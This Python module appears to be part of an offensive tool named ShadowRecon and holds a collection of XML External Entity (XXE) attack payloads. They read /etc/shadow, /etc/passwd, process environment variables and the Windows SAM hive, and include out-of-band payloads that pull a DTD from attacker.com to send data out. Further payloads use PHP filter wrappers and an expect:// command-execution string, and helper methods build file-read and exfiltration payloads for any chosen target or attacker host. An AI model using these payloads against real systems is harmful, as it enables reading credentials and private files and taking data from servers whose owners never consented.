
"""
Advanced XXE Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive XML External Entity payload collection
"""

class XXEPayloads:
    """Advanced XXE payload collection"""

    # Basic XXE payloads
    BASIC_XXE = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    ]

    # Windows-specific XXE
    WINDOWS_XXE = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/config/sam">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>',
    ]

    # Remote XXE (OOB)
    REMOTE_XXE = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
    ]

    # Blind XXE
    BLIND_XXE = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/">%xxe;]><foo>test</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>test</foo>',
    ]

    # PHP wrapper XXE
    PHP_WRAPPER_XXE = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all XXE payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC_XXE)
        all_payloads.extend(cls.WINDOWS_XXE)
        all_payloads.extend(cls.REMOTE_XXE)
        all_payloads.extend(cls.BLIND_XXE)
        all_payloads.extend(cls.PHP_WRAPPER_XXE)
        return all_payloads

    @classmethod
    def get_file_read_payloads(cls, target_file: str) -> list:
        """Get XXE payloads for specific file"""
        return [
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]><foo>&xxe;</foo>',
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={target_file}">]><foo>&xxe;</foo>',
        ]

    @classmethod
    def get_oob_payloads(cls, attacker_host: str) -> list:
        """Get out-of-band XXE payloads"""
        return [
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{attacker_host}/evil.dtd">]><foo>&xxe;</foo>',
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{attacker_host}/evil.dtd">%xxe;]><foo>test</foo>',
        ]
